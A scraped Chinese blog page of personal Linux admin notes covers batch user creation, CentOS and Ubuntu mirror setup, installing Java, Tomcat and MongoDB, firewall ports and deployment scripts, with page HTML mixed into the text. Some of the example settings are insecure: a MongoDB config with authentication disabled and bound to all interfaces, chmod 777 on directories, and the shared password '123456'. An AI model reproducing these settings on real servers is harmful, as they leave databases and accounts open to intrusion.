6 7 8 9 10 11 12 13 ＃ cat /etc/passwd root❌0:0:Superuser:/: daemon❌1:1:System daemons:/etc: bin❌2:2:Owner of system commands:/bin: sys❌3:3:Owner of system files:/usr/sys: adm❌4:4:System accounting:/usr/adm: uucp❌5:5:UUCP administrator:/usr/lib/uucp: auth❌7:21:Authentication administrator:/tcb/files/auth: cron❌9:16:Cron daemon:/usr/spool/cron: listen❌37:4:Network daemon:/usr/net/nls: lp❌71:18:Printer administrator:/usr/spool/lp: sam❌200:50:Sam san:/home/sam:/bin/sh 从上面的例子我们可以看到，/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：\n1 用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell 添加批量用户 （1）先编辑一个文本用户文件。\n每一列按照/etc/passwd密码文件的格式书写，要注意每个用户的用户名、UID、宿主目录都不可以相同，其中密码栏可以留做空白或输入x号。一个范例文件user.txt内容如下：\n1 2 3 4 5 6 user001::600:100:user:/home/user001:/bin/bash user002::601:100:user:/home/user002:/bin/bash user003::602:100:user:/home/user003:/bin/bash user004::603:100:user:/home/user004:/bin/bash user005::604:100:user:/home/user005:/bin/bash user006::605:100:user:/home/user006:/bin/bash （2）以root身份执行命令 /usr/sbin/newusers，从刚创建的用户文件user.txt中导入数据，创建用户：\n1 # newusers \u003c user.txt 然后可以执行命令 vipw 或 vi /etc/passwd 检查 /etc/passwd 文件是否已经出现这些用户的数据，并且用户的宿主目录是否已经创建。\n（3）执行命令/usr/sbin/pwunconv。\n将 /etc/shadow 产生的 shadow 密码解码，然后回写到 /etc/passwd 中，并将/etc/shadow的shadow密码栏删掉。这是为了方便下一步的密码转换工作，即先取消 shadow password 功能。\n1 # pwunconv （4）编辑每个用户的密码对照文件。\n格式为：\n1 用户名:密码 实例文件 passwd.txt 内容如下：\n1 2 3 4 5 6 user001:123456 user002:123456 user003:123456 user004:123456 user005:123456 user006:123456 （5）以 root 身份执行命令 /usr/sbin/chpasswd。\n创建用户密码，chpasswd 会将经过 /usr/bin/passwd 命令编码过的密码写入 /etc/passwd 的密码栏。\n1 # chpasswd \u003c passwd.txt （6）确定密码经编码写入/etc/passwd的密码栏后。\n执行命令 /usr/sbin/pwconv 将密码编码为 shadow password，并将结果写入 /etc/shadow。\n1 # pwconv 这样就完成了大量用户的创建了，之后您可以到/home下检查这些用户宿主目录的权限设置是否都正确，并登录验证用户密码是否正确。\nCentos 换国内源 https://blog.csdn.net/sinat_31089473/article/details/105929293\n1 2 3 4 5 6 7 8 备份一份文件 cp /etc/yum.repos.d/CentOS-Base.repo.backup /etc/yum.repos.d/CentOS-Base.repo 下载国内源 wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo 生成缓存 yum makecache 安装Java https://www.cnblogs.com/lumama520/p/11058927.html\n1 2 3 4 5 6 7 8 9 10 11 解压压缩包 tar -zxvf /home/binbin/jdk-8u301-linux-x64.tar.gz -C /usr/local/java/ 配置环境变量 vim /etc/profile 使环境变量生效 source /etc/profile 检查Java版本 java -version 安装Tomcat https://blog.csdn.net/qq_21077715/article/details/85541685\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 新建文件夹 mkdir usr/local/tomcat9 解压压缩包 tar -zxvf /home/binbin/apache-tomcat-9.0.54.tar.gz -C /usr/local/tomcat9/ 启动tomcat /usr/local/tomcat9/apache-tomcat-9.0.54/bin/startup.sh 开放防火墙端口 firewall-cmd --zone=public --add-port=8080/tcp --permanent firewall-cmd --reload 查看防火墙信息 firewall-cmd --list-all 开放对外端口 ==注意：centos7自带的防火墙已经不是iptables了，改成了firewalld== ufw也是一种防火墙\n执行命令时，出现firewalld is not running的报错，用以下命令将firewalld起起来即可\n1.查看firewalld状态：systemctl status firewalld，如果是dead状态，即防火墙未开启。\n2.开启防火墙：systemctl start firewalld\n3.确认firewalld状态:systemctl status firewalld\n4.开放默认端口号 3306，出现success表示成功\n1 firewall-cmd --permanent --zone=public --add-port=3306/tcp 5.重新加载防火墙配置：firewall-cmd --reload\n6.设置firewalld开机启动：systemctl enable firewalld\n7.关闭防火墙：systemctl stop firewalld\n8.查看该机器有几个端口开放：firewall-cmd --list-all、firewall-cmd --zone=public --list-ports\n经过上述操作后外网还是访问不到tomcat\n可能是服务没开？\nhttps://www.cnblogs.com/cui0614/p/12746383.html\n但是开了之后还不行\n==主要原因是我是在腾讯云上买的服务器，所以要在腾讯云上面先开端口号~！！！！==\n因为centos7自带的防火墙已经不是iptables了，改成了firewalld，所以不用下面的这种方法解决\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # Generated by iptables-save v1.4.7 on Tue Aug 20 10:09:45 2019 *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [19:1438] -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A INPUT -p icmp -j ACCEPT -A INPUT -i lo -j ACCEPT -A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT -A INPUT -p tcp -m tcp --dport 20001 -j ACCEPT -A INPUT -j REJECT --reject-with icmp-host-prohibited -A FORWARD -j REJECT --reject-with icmp-host-prohibited COMMIT # Completed on Tue Aug 20 10:09:45 2019 注意这一行-A INPUT -j REJECT --reject-with icmp-host-prohibited，如果我们添加的规则在这行之下那么就不会生效\n解决办法：在-A INPUT -j REJECT --reject-with icmp-host-prohibited之前加入我们的规则即可\n如果防火墙放行了端口，但是仍然访问不到的话，可能是因为添加规则的时候，用的是iptables -A 选项，这样，增加的规则会排列在 第6条 规则后面，虽然service iptables status显示放行了端口，但是实际上，由于第六条规则的原因，新增加的这条并没有起作用。\n改为使用iptables -I 插入规则即可，将规则添加到 第6条 之前，就可以生效了。\n但是当我执行service iptables status命令时出现如下错误：\n1 2 Redirecting to /bin/systemctl status iptables.service Unit iptables.service could not be found. 原因是没有安装iptables-services\nhttps://blog.csdn.net/y368769/article/details/104490697/\n安装MongoDB https://www.jianshu.com/p/994bc7b19b26\nhttps://www.cnblogs.com/xiaoyaojinzhazhadehangcheng/p/12156597.html\n1.解压\n1 tar -zxvf /home/binbin/mongodb-linux-x86_64-4.0.0.tgz -C /usr/local/ 之后装的时候把文件目录改个名，因为之后要有很多关于这个目录的配置\n1 2 [root@VM-4-12-centos ~]# cd /usr/local [root@VM-4-12-centos local]# mv mongodb-linux-x86_64-4.0.0/ mongodb 2.修改配置文件\n1 vim /etc/profile 在 export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROL 一行的上面添加如下内容:\n1 2 #set mongodb export PATH=/usr/local/mongodb-linux-x86_64-4.0.0/bin:$PATH 使环境变量生效\n1 source /etc/profile 3.创建数据库目录\n1 2 3 4 5 6 $ cd /usr/local/mongodb $ touch mongodb.conf $ mkdir db $ mkdir log $ cd log $ touch mongodb.log 4.修改mongodb配置文件\n1 vim /usr/local/mongodb/mongodb.conf 添加以下内容\n1 2 3 4 5 6 7 8 9 10 11 port=27017 #端口 dbpath= /usr/local/mongodb/db #数据库存文件存放目录 logpath= /usr/local/mongodb/log/mongodb.log #日志文件存放路径 logappend=true #使用追加的方式写日志 fork=true #以守护进程的方式运行，创建服务器进程 maxConns=100 #最大同时连接数 noauth=true #不启用验证 journal=true #每次写入会记录一条操作日志（通过journal可以重新构造出写入的数据）。 #即使宕机，启动时wiredtiger会先将数据恢复到最近一次的checkpoint点，然后重放后续的journal日志来恢复。 storageEngine=wiredTiger #存储引擎有mmapv1、wiretiger、mongorocks bind_ip = 0.0.0.0 #这样就可外部访问了，例如从win10中去连虚拟机中的MongoDB 5.设置文件夹权限\n1 2 3 $ cd /usr/local/mongodb $ chmod 777 db $ chmod 777 log 6.启动mongodb\n1 mongod --config /usr/local/mongodb/mongodb.conf 7.安装完之后记得开放端口\n部署项目 https://www.cnblogs.com/shu-java-net/p/13886242.html\n1.Springboot 先打包成jar包\n2.放到服务器上\n1 nohup java -jar NettyAPI.jar \u0026 nohup 意思是不挂断运行命令,当账户退出或终端关闭时,程序仍然运行，\n当用 nohup 命令执行作业时，缺省情况下该作业的所有输出被重定向到nohup.out的文件中，除非另外指定了输出文件。\n3.结束项目\n1 ps -aux | grep java 把这个端口kill掉\n1 kill -s 9 4287 4.使用nginx：外网访问内网项目\n1 nginx -s reload 写 .sh 自动启动 1、自己将项目（比如用springboot框架写的项目）打包成jar包，然后我们需要将它用软件传输到linux版本的服务器上（服务器提前安装好JDK\u003e=1.8）。\n2、自己编写sh命令，用于启动和关闭项目，并打印日志信息到服务器本地。\n1）、start_项目名.sh文件\n1 2 3 4 5 6 7 8 9 #For shutting down the 你的项目名.jar pid=$(ps -ef | grep 你的项目名.jar| grep -v \"grep\" | awk '{print $2}') kill -9 $pid echo \"The 你的项目名.jar now has been shut down!\" #For starting the 你的项目名.jar nohup java -jar 你的项目名.jar \u003e你的项目日志名.output 2\u003e\u00261 \u0026 echo \"The 你的项目名.jar now is running!\" tailf 你的项目日志名.output 2）、shutdown_项目名.sh文件\n1 2 3 4 #For shutting down the 你的项目名.jar pid=$(ps -ef | grep 你的项目名.jar| grep -v \"grep\" | awk '{print $2}') kill -9 $pid echo \"The 你的项目名.jar now has been shut down!\" 3、将你的项目jar包、start_项目名.sh、shutdown_项目名.sh放在服务器的某一个文件夹下（他三个处于同一个目录）,此时，可以用控制台启动和关闭项目了。\n4、写完之后放到服务器上面要转换换行符\nhttps://blog.csdn.net/li_1303999/article/details/93159197\n文件下载 使用\nsz hadoop-mapreduce-examples-3.1.3.jar\n安装\nyum install -y lrzsz\n虚拟机扩容 https://blog.csdn.net/cc1949/article/details/89918775\n安装gparted\n1 yum install gparted 打开gparted\n1 sudo gparted 按照上述操作之后， df -h 还是没有变化\n输入 lsblk 发现分区并没有分完，虽然增加到sda2，但是每增加带centos-root中\n把用gparted划分的空间撤回，重新进行分区操作：\nhttps://blog.csdn.net/Akari0216/article/details/108944111\nhttps://zhuanlan.zhihu.com/p/450057653\n扩容之后\n==更新UUID值==\nhttps://blog.csdn.net/Chen_qi_hai/article/details/108814596\n查看mongodb安装路径 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #方法一 find / -name mongodb #方法二 locate mongodb #方法三 whereis mongodb #方法四 which mongodb 命令行注解 ps 1）ps -a 显示现行终端机下的所有程序，包括其他用户的程序。\n2）ps -A 显示所有程序。\n3）ps -c 列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。\n4）ps -e 此参数的效果和指定\"A\"参数相同。\n5）ps -e 列出程序时，显示每个程序所使用的环境变量。\n6）ps -f 用ASCII字符显示树状结构，表达程序间的相互关系。\n7）ps -H 显示树状结构，表示程序间的相互关系。\n8）ps -N 显示所有的程序，除了执行ps指令终端机下的程序之外。\n9）ps -s 采用程序信号的格式显示程序状况。\n10）ps - S 列出程序时，包括已中断的子程序资料。\n11）ps -t \u003c终端机编号\u003e指定终端机编号，并列出属于该终端机的程序的状况。\n12）ps -u username\ngrep 用于查找文件里符合条件的字符串\n管道符号 | 用法: command 1 | command 2 他的功能是把第一个命令command 1执行的结果作为command 2的输入传给command 2\nsed 参数说明：\n-i：使 sed 修改文件 -e",
  "wordCount" : "11049",
  "inLanguage": "zh",
  "datePublished": "2023-03-21T00:00:00Z",
  "dateModified": "2023-03-21T00:00:00Z",
  "author":[{
    "@type": "Person",
    "name": "chance7bin"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://chance7bin.github.io/posts/note/linux%E6%89%8B%E5%86%8C/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Binb's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://chance7bin.github.io/img/%E7%BE%8E%E9%98%9F.jpg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://chance7bin.github.io/" accesskey="h" title="Binb&#39;s Blog (Alt + H)">
                <img src="https://chance7bin.github.io/img/%E7%BE%8E%E9%98%9F.jpg" alt="" aria-label="logo"
                    height="35">Binb&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://chance7bin.github.io/search" title="🔍搜索 (Alt &#43; /)" accesskey=/>
                    <span>🔍搜索</span>
                </a>
            </li>
            <li>
                <a href="https://chance7bin.github.io/" title="🏠 主页">
                    <span>🏠 主页</span>
                </a>
            </li>
            <li>
                <a href="https://chance7bin.github.io/archives/" title="⏱️ 时间轴">
                    <span>⏱️ 时间轴</span>
                </a>
            </li>
            <li>
                <a href="https://chance7bin.github.io/posts" title="📚 文章">
                    <span>📚 文章</span>
                </a>
            </li>
            <li>
                <a href="https://chance7bin.github.io/tags" title="🔖 标签">
                    <span>🔖 标签</span>
                </a>
            </li>
            <li>
                <a href="https://github.com/chance7bin" title="GitHub">
                    <span>GitHub</span>&nbsp;
                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
                        <path d="M15 3h6v6"></path>
                        <path d="M10 14L21 3"></path>
                    </svg>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://chance7bin.github.io/">🏠 主页</a>&nbsp;»&nbsp;<a href="https://chance7bin.github.io/posts/">📚 文章</a>&nbsp;»&nbsp;<a href="https://chance7bin.github.io/posts/note/">👨🏻‍💻 我的笔记</a></div>
    <h1 class="post-title">
      Linux手册
    </h1>
    <div class="post-meta">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">


<style>
    i[id*="post_meta_style"] {
        display: flex;
        align-items: center;
        margin: 0 0 10px 0;
    }

    .parent-post-meta {
        display: flex;
        flex-wrap: wrap;
        opacity: 0.8;
    }
</style>

<span class="parent-post-meta">
    <span id="post_meta_style_1">
        <span class="fa fa-calendar-check-o"></span>
        <span>2023-03-21
            &nbsp;&nbsp;
        </span>
    </span>
    
    
    
    
    
    
    
    <span id="post_meta_style_3">
        <span class="fa fa-file-word-o"></span>
        <span>11049字
            &nbsp;&nbsp;
        </span>
    </span>
    <span id="post_meta_style_4">
        <span class="fa fa-clock-o"></span>
        <span>23分钟
            &nbsp;&nbsp;
        </span>
    </span>
    <span id="post_meta_style_5">
        <span class="fa fa-user-o"></span>
        <span>chance7bin
            &nbsp;&nbsp;
        </span>
    </span>
    <span id="post_meta_style_6">
        <span class="fa fa-tags" style="opacity: 0.8"></span>
        <span>
            <span class="post-tags-meta">
                <a href="https://chance7bin.github.io/tags/linux/" style="color: var(--secondary)!important;">Linux</a>
            </span>
        </span>
    </span>

    
</span>


      
      
      
      
      
      
      
          
          
          
              
              
              
              
          
      
    </div>
  </header>
   <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">目录</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#ubuntu" aria-label="Ubuntu">Ubuntu</a><ul>
                            
                    <li>
                        <a href="#apt%e6%8d%a2%e5%9b%bd%e5%86%85%e6%ba%90" aria-label="apt换国内源">apt换国内源</a></li>
                    <li>
                        <a href="#%e8%ae%be%e7%bd%aeroot%e5%af%86%e7%a0%81" aria-label="设置root密码">设置root密码</a></li>
                    <li>
                        <a href="#%e6%8f%90%e5%8d%87%e7%94%a8%e6%88%b7%e6%9d%83%e9%99%90" aria-label="提升用户权限">提升用户权限</a></li>
                    <li>
                        <a href="#%e5%ae%89%e8%a3%85java" aria-label="安装Java">安装Java</a></li>
                    <li>
                        <a href="#%e5%ae%89%e8%a3%85tomcat" aria-label="安装Tomcat">安装Tomcat</a></li>
                    <li>
                        <a href="#%e5%bc%80%e5%90%af%e8%bf%9c%e7%a8%8b%e8%bf%9e%e6%8e%a5ssh%e6%9c%8d%e5%8a%a1%e7%ab%af" aria-label="开启远程连接ssh服务端">开启远程连接ssh服务端</a></li>
                    <li>
                        <a href="#%e5%bc%80%e5%90%af%e8%bf%9c%e7%a8%8b%e8%bf%9e%e6%8e%a5ubuntu-root%e6%9d%83%e9%99%90" aria-label="开启远程连接ubuntu root权限">开启远程连接ubuntu root权限</a></li>
                    <li>
                        <a href="#ubuntu%e8%be%93%e5%85%a5su%e6%8f%90%e7%a4%ba%e8%ae%a4%e8%af%81%e5%a4%b1%e8%b4%a5%e7%9a%84%e8%a7%a3%e5%86%b3%e6%96%b9%e6%b3%95%e6%8e%a5%e4%b8%8a" aria-label="Ubuntu输入su提示认证失败的解决方法（接上）"><strong>Ubuntu输入su提示认证失败的解决方法（接上）</strong></a></li>
                    <li>
                        <a href="#xshell%e4%b8%80%e7%9b%b4%e6%96%ad%e5%bc%80%e8%bf%9e%e6%8e%a5socket-error-event-32-error-10053" aria-label="xshell一直断开连接：Socket error Event: 32 Error: 10053">xshell一直断开连接：Socket error Event: 32 Error: 10053</a></li>
                    <li>
                        <a href="#%e5%ae%89%e8%a3%85nginx" aria-label="安装Nginx">安装Nginx</a></li>
                    <li>
                        <a href="#tomcat%e5%bc%80%e6%94%be%e5%af%b9%e5%a4%96%e7%9a%84%e7%ab%af%e5%8f%a3" aria-label="Tomcat开放对外的端口">Tomcat开放对外的端口</a></li>
                    <li>
                        <a href="#windows%e6%96%87%e4%bb%b6%e6%8d%a2%e8%a1%8c%e7%ac%a6%e8%bd%aclinux%e6%8d%a2%e8%a1%8c%e7%ac%a6" aria-label="Windows文件换行符转Linux换行符">Windows文件换行符转Linux换行符</a></li>
                    <li>
                        <a href="#%e5%ae%89%e8%a3%85anaconda" aria-label="安装anaconda">安装anaconda</a></li>
                    <li>
                        <a href="#%e5%ae%89%e8%a3%85mongodb" aria-label="安装mongodb">安装mongodb</a><ul>
                            
                    <li>
                        <a href="#apt%e5%ae%89%e8%a3%85" aria-label="apt安装">apt安装</a></li>
                    <li>
                        <a href="#%e5%8e%8b%e7%bc%a9%e5%8c%85%e5%ae%89%e8%a3%85" aria-label="压缩包安装">压缩包安装</a></li></ul>
                    </li>
                    <li>
                        <a href="#mongodb%e5%bd%bb%e5%ba%95%e5%8d%b8%e8%bd%bd%e6%96%b9%e5%bc%8f" aria-label="mongodb彻底卸载方式">mongodb彻底卸载方式</a></li>
                    <li>
                        <a href="#%e5%ae%89%e8%a3%85redis" aria-label="安装redis">安装redis</a></li>
                    <li>
                        <a href="#linux%e7%ae%a1%e7%90%86python%e6%8e%a8%e8%8d%90%e4%bd%bf%e7%94%a8minicondahttpsdocscondaioenlatestminicondahtml" aria-label="Linux管理python推荐使用miniconda">Linux管理python推荐使用<a href="https://docs.conda.io/en/latest/miniconda.html">miniconda</a></a></li>
                    <li>
                        <a href="#%e6%96%b0%e5%bb%ba%e7%94%a8%e6%88%b7" aria-label="新建用户">新建用户</a><ul>
                            
                    <li>
                        <a href="#%e6%96%b0%e5%a2%9e%e5%8d%95%e4%b8%aa%e7%94%a8%e6%88%b7" aria-label="新增单个用户">新增单个用户</a></li>
                    <li>
                        <a href="#%e5%88%a0%e9%99%a4%e5%b8%90%e5%8f%b7" aria-label="删除帐号">删除帐号</a></li>
                    <li>
                        <a href="#%e6%b7%bb%e5%8a%a0%e6%89%b9%e9%87%8f%e7%94%a8%e6%88%b7" aria-label="添加批量用户">添加批量用户</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#centos" aria-label="Centos">Centos</a><ul>
                            
                    <li>
                        <a href="#%e6%8d%a2%e5%9b%bd%e5%86%85%e6%ba%90" aria-label="换国内源">换国内源</a></li>
                    <li>
                        <a href="#%e5%ae%89%e8%a3%85java-1" aria-label="安装Java">安装Java</a></li>
                    <li>
                        <a href="#%e5%ae%89%e8%a3%85tomcat-1" aria-label="安装Tomcat">安装Tomcat</a></li>
                    <li>
                        <a href="#%e5%bc%80%e6%94%be%e5%af%b9%e5%a4%96%e7%ab%af%e5%8f%a3" aria-label="开放对外端口">开放对外端口</a></li>
                    <li>
                        <a href="#%e5%ae%89%e8%a3%85mongodb-1" aria-label="安装MongoDB">安装MongoDB</a></li>
                    <li>
                        <a href="#%e9%83%a8%e7%bd%b2%e9%a1%b9%e7%9b%ae" aria-label="部署项目">部署项目</a><ul>
                            
                    <li>
                        <a href="#%e5%86%99-sh-%e8%87%aa%e5%8a%a8%e5%90%af%e5%8a%a8" aria-label="写 .sh 自动启动">写 <code>.sh</code> 自动启动</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e6%96%87%e4%bb%b6%e4%b8%8b%e8%bd%bd" aria-label="文件下载">文件下载</a></li>
                    <li>
                        <a href="#%e8%99%9a%e6%8b%9f%e6%9c%ba%e6%89%a9%e5%ae%b9" aria-label="虚拟机扩容">虚拟机扩容</a></li>
                    <li>
                        <a href="#%e6%9f%a5%e7%9c%8bmongodb%e5%ae%89%e8%a3%85%e8%b7%af%e5%be%84" aria-label="查看mongodb安装路径">查看mongodb安装路径</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e5%91%bd%e4%bb%a4%e8%a1%8c%e6%b3%a8%e8%a7%a3" aria-label="命令行注解">命令行注解</a><ul>
                            
                    <li>
                        <a href="#ps" aria-label="ps">ps</a></li>
                    <li>
                        <a href="#grep" aria-label="grep">grep</a></li>
                    <li>
                        <a href="#%e7%ae%a1%e9%81%93%e7%ac%a6%e5%8f%b7-" aria-label="管道符号 |">管道符号 |</a></li>
                    <li>
                        <a href="#sed" aria-label="sed">sed</a></li>
                    <li>
                        <a href="#xargs" aria-label="xargs">xargs</a></li>
                    <li>
                        <a href="#%e6%9f%a5%e7%9c%8b%e7%a3%81%e7%9b%98%e7%9a%84%e5%8d%a0%e7%94%a8%e6%83%85%e5%86%b5" aria-label="查看磁盘的占用情况">查看磁盘的占用情况</a></li>
                    <li>
                        <a href="#%e6%9f%a5%e7%9c%8b%e5%bd%93%e5%89%8d%e7%9b%ae%e5%bd%95%e4%b8%8b%e6%af%8f%e4%b8%aa%e6%96%87%e4%bb%b6%e5%a4%b9%e6%89%80%e5%8d%a0%e7%94%a8%e7%9a%84%e7%a9%ba%e9%97%b4" aria-label="查看当前目录下每个文件夹所占用的空间">查看当前目录下每个文件夹所占用的空间</a></li>
                    <li>
                        <a href="#vim%e6%9f%a5%e6%89%be" aria-label="vim查找">vim查找</a></li>
                    <li>
                        <a href="#update%e5%92%8cupgrade" aria-label="update和upgrade">update和upgrade</a></li></ul>
                    </li>
                    <li>
                        <a href="#linux%e7%9f%a5%e8%af%86" aria-label="Linux知识">Linux知识</a><ul>
                            
                    <li>
                        <a href="#%e8%bd%af%e8%bf%9e%e6%8e%a5" aria-label="软连接">软连接</a></li>
                    <li>
                        <a href="#usrbin%e5%92%8cusrlocalbin" aria-label="/usr/bin和/usr/local/bin,"><code>/usr/bin</code>和<code>/usr/local/bin</code>,</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>
  <div class="post-content"><h2 id="ubuntu">Ubuntu<a hidden class="anchor" aria-hidden="true" href="#ubuntu">#</a></h2>
<h3 id="apt换国内源">apt换国内源<a hidden class="anchor" aria-hidden="true" href="#apt换国内源">#</a></h3>
<p><a href="https://blog.csdn.net/RadiantJeral/article/details/104184351">https://blog.csdn.net/RadiantJeral/article/details/104184351</a></p>
<p><a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a></p>
<p>打开终端输入命令下载vim工具</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt-get install vim
</span></span></code></pre></td></tr></table>
</div>
</div><p>1.备份<code> /etc/apt/sources.list</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.编辑<code> /etc/apt/sources.list</code></p>
<p>打开 <code>/etc/apt/sources.list</code>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo vim /etc/apt/sources.list
</span></span></code></pre></td></tr></table>
</div>
</div><p>在命令模式下输入 <code>ggdG</code>，删除全部内容.</p>
<p>在输入模式下，粘贴复制下列内容：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span>
</span></span><span class="line"><span class="cl">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse
</span></span><span class="line"><span class="cl"><span class="c1"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span>
</span></span><span class="line"><span class="cl">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse
</span></span><span class="line"><span class="cl"><span class="c1"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span>
</span></span><span class="line"><span class="cl">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse
</span></span><span class="line"><span class="cl"><span class="c1"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span>
</span></span><span class="line"><span class="cl">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse
